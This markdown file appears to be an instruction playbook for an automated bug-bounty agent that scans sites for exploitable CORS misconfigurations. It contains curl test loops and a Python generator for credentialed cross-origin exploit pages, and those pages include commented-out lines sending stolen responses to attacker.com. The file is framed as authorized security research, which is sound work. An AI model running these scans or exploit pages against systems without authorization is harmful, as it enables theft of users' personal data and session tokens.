# CORS Chain Analyzer Agent

Automated CORS misconfiguration scanner. Tests 7+ origin reflection patterns against every live endpoint, identifies exploitable CORS+credentials combinations, and generates ready-to-submit PoC HTML. This is the automated version of the methodology that found the CLEAR and Stripchat CORS bugs.

## Prerequisites

```bash
which curl || apt install -y curl
which jq || apt install -y jq
which python3 || apt install -y python3
```

## Phase 1: Endpoint Discovery

```bash
TARGET="https://target.com"

# Crawl for API endpoints
# From JS files:
curl -sk "$TARGET/" | grep -oP '["'"'"'](/api/[^"'"'"'\s]+)' | sort -u | tee endpoints.txt

# From sitemap/robots
curl -sk "$TARGET/robots.txt" | grep -oP '(?:Allow|Disallow): (.+)' | awk '{print $2}' >> endpoints.txt
curl -sk "$TARGET/sitemap.xml" | grep -oP '<loc>[^<]+</loc>' | sed 's/<[^>]*>//g' >> endpoints.txt

# Common API paths
COMMON_APIS=(
  "/api/me" "/api/user" "/api/profile" "/api/account"
  "/api/v1/user" "/api/v1/me" "/api/v1/account"
  "/api/settings" "/api/notifications" "/api/messages"
  "/api/billing" "/api/payment-methods" "/api/orders"
  "/graphql" "/api/graphql"
  "/userinfo" "/oauth/userinfo" "/.well-known/openid-configuration"
)
for EP in "${COMMON_APIS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$EP" \
    -H "Cookie: $AUTH_COOKIE" -H "X-HackerOne-Research: $H1USER")
  [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "$EP" >> endpoints.txt
done
sort -u -o endpoints.txt endpoints.txt
```

## Phase 2: CORS Origin Test Matrix

Test each endpoint against 7+ origin patterns:

```bash
test_cors() {
  local URL="$1"
  local ORIGIN="$2"
  local LABEL="$3"

  RESPONSE=$(curl -sk -D- "$URL" \
    -H "Origin: $ORIGIN" \
    -H "Cookie: $AUTH_COOKIE" \
    -H "X-HackerOne-Research: $H1USER" \
    -o /tmp/cors_body.txt)

  ACAO=$(echo "$RESPONSE" | grep -i "access-control-allow-origin:" | tr -d '\r' | awk '{print $2}')
  ACAC=$(echo "$RESPONSE" | grep -i "access-control-allow-credentials:" | tr -d '\r' | awk '{print $2}')

  if [ -n "$ACAO" ]; then
    echo "[$LABEL] $URL"
    echo "  Origin sent: $ORIGIN"
    echo "  ACAO: $ACAO"
    echo "  ACAC: $ACAC"
    [ "$ACAC" = "true" ] && [ "$ACAO" = "$ORIGIN" ] && echo "  >>> EXPLOITABLE <<<"
  fi
}

DOMAIN="target.com"

while read EP; do
  URL="$TARGET$EP"

  # 1. Attacker domain — full reflection
  test_cors "$URL" "https://attacker.com" "ATTACKER_DOMAIN"

  # 2. Subdomain of attacker — suffix matching
  test_cors "$URL" "https://evil.$DOMAIN" "EVIL_SUBDOMAIN"

  # 3. Attacker as subdomain prefix — prefix matching
  test_cors "$URL" "https://${DOMAIN}.attacker.com" "PREFIX_MATCH"

  # 4. null origin — sandboxed iframe
  RESPONSE=$(curl -sk -D- "$URL" -H "Origin: null" -H "Cookie: $AUTH_COOKIE")
  ACAO=$(echo "$RESPONSE" | grep -i "access-control-allow-origin:" | awk '{print $2}' | tr -d '\r')
  ACAC=$(echo "$RESPONSE" | grep -i "access-control-allow-credentials:" | awk '{print $2}' | tr -d '\r')
  [ "$ACAO" = "null" ] && echo "[NULL_ORIGIN] $URL  ACAO: null  ACAC: $ACAC"

  # 5. HTTP downgrade — http:// instead of https://
  test_cors "$URL" "http://$DOMAIN" "HTTP_DOWNGRADE"

  # 6. Suffix match — target.com.evil.com
  test_cors "$URL" "https://${DOMAIN}.evil.com" "SUFFIX_MATCH"

  # 7. Special characters — underscore, dash variations
  test_cors "$URL" "https://attacker-$DOMAIN" "DASH_PREFIX"

  # 8. Wildcard check
  RESPONSE=$(curl -sk -D- "$URL" -H "Origin: https://anything.com" -H "Cookie: $AUTH_COOKIE")
  ACAO=$(echo "$RESPONSE" | grep -i "access-control-allow-origin:" | awk '{print $2}' | tr -d '\r')
  [ "$ACAO" = "*" ] && echo "[WILDCARD] $URL  ACAO: *"

done < endpoints.txt
```

## Phase 3: Sensitive Data Assessment

For each CORS+credentials hit, check what data is exposed:

```bash
# Fetch the endpoint with credentials to see what data leaks
for EP in $(cat cors_hits.txt); do
  echo "=== $EP ==="
  curl -sk "$TARGET$EP" -H "Cookie: $AUTH_COOKIE" | python3 -m json.tool 2>/dev/null | \
    grep -iE "email|name|phone|address|token|key|secret|password|ssn|card|credit|balance|billing"
done
```

## Phase 4: Cookie Analysis

```bash
# Check if cookies are SameSite=None (required for cross-origin credentialed requests)
curl -sk -D- "$TARGET/api/auth/login" -o /dev/null | grep -i "set-cookie"

# Look for:
# SameSite=None  -> exploitable cross-site (CORS attack works from attacker.com)
# SameSite=Lax   -> only exploitable via top-level navigation (limited)
# SameSite=Strict -> not exploitable cross-site
# No SameSite    -> browser defaults to Lax (Chrome), but older browsers treat as None

# Check if Secure flag is set (required with SameSite=None)
curl -sk -D- "$TARGET/" -o /dev/null | grep -i "set-cookie" | grep -i "secure"
```

## Phase 5: Simple Request Check

```bash
# Check if the request is "simple" (no preflight needed)
# Simple requests: GET, HEAD, POST with specific Content-Types
# If simple, the browser sends credentials WITHOUT preflight — more dangerous

for EP in $(cat cors_hits.txt); do
  # Test as GET (always simple)
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$EP" \
    -H "Cookie: $AUTH_COOKIE" -H "Origin: https://attacker.com")
  echo "GET $EP: $CODE"

  # Test as POST with form content-type (simple)
  CODE=$(curl -sk -X POST -o /dev/null -w "%{http_code}" "$TARGET$EP" \
    -H "Cookie: $AUTH_COOKIE" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Origin: https://attacker.com")
  echo "POST (form) $EP: $CODE"

  # If the endpoint works with simple methods, no preflight = immediate exploit
done
```

## Phase 6: PoC Generation

```python
#!/usr/bin/env python3
"""Generate CORS exploit PoC HTML for confirmed findings."""
import sys

ENDPOINT = sys.argv[1]       # https://target.com/api/me
EVIL_ORIGIN = sys.argv[2]    # https://attacker.com (or null for iframe)

if EVIL_ORIGIN == "null":
    poc = f"""<!DOCTYPE html>
<html>
<head><title>CORS PoC - null origin</title></head>
<body>
<h2>CORS Exploit PoC (null origin via sandbox iframe)</h2>
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('{ENDPOINT}', {{credentials: 'include'}})
      .then(r => r.text())
      .then(d => {{
        document.getElementById('result').textContent = d;
        // Exfiltrate: new Image().src = 'https://attacker.com/log?data=' + btoa(d);
      }});
  </script>
  <pre id='result'>Loading...</pre>
"></iframe>
</body>
</html>"""
else:
    poc = f"""<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<h2>CORS Exploit PoC</h2>
<p>This page reads sensitive data from <code>{ENDPOINT}</code> using the victim's cookies.</p>
<pre id="result">Loading...</pre>
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', '{ENDPOINT}', true);
  xhr.withCredentials = true;
  xhr.onreadystatechange = function() {{
    if (xhr.readyState === 4) {{
      document.getElementById('result').textContent = xhr.responseText;
      // Exfiltrate to attacker server:
      // fetch('https://attacker.com/log', {{method:'POST', body: xhr.responseText}});
    }}
  }};
  xhr.send();
</script>
</body>
</html>"""

print(poc)
```

```bash
# Generate PoC for a confirmed finding
python3 /tmp/cors_poc.py "https://target.com/api/me" "https://attacker.com" > /tmp/cors_poc.html

# For null origin variant
python3 /tmp/cors_poc.py "https://target.com/api/me" "null" > /tmp/cors_poc_null.html
```

## Phase 7: Priority Ranking

Rank findings by exploitability:

```
CRITICAL:
  - ACAO reflects arbitrary origin + ACAC: true + endpoint returns PII/tokens
  - ACAO: null + ACAC: true + sensitive data (null origin = sandbox iframe)

HIGH:
  - ACAO reflects attacker subdomain + ACAC: true + PII
  - ACAO reflects HTTP downgrade + ACAC: true (MitM + CORS chain)

MEDIUM:
  - ACAO: * (no credentials, but may expose non-auth endpoints)
  - ACAO reflects origin but ACAC: false (limited impact)
  - CORS on non-sensitive endpoints with credentials

LOW:
  - CORS on public/non-authenticated endpoints
  - ACAO reflects but SameSite=Strict cookies (unexploitable cross-site)
```

## Severity Classification

| Finding | Severity |
|---------|----------|
| Arbitrary origin reflection + credentials + PII/tokens | Critical |
| null origin + credentials + PII | Critical |
| Subdomain reflection + credentials + PII | High |
| HTTP downgrade reflection + credentials | High |
| Arbitrary origin + credentials + non-sensitive data | Medium |
| Wildcard ACAO without credentials on authenticated endpoint | Medium |
| CORS on public endpoints only | Low |

## Output Format

For each finding:
1. **Endpoint**: URL that reflects CORS
2. **Origin Pattern**: Which test pattern triggered reflection
3. **ACAO Value**: Exact reflected value
4. **Credentials**: Whether ACAC: true is set
5. **Sensitive Data**: What the endpoint returns (PII, tokens, etc.)
6. **Cookie SameSite**: None/Lax/Strict
7. **Simple Request**: Yes/No (does it need preflight?)
8. **PoC**: Link to generated HTML exploit
9. **Severity**: Critical/High/Medium/Low with justification

## Rules

- Test only on authorized targets and your own accounts
- Never exfiltrate real user data — use your own test accounts
- CORS PoCs should log to console, not actually send data to external servers
- Include X-HackerOne-Research header on all requests
- Test all endpoints, not just the obvious ones — CORS bugs hide on forgotten APIs
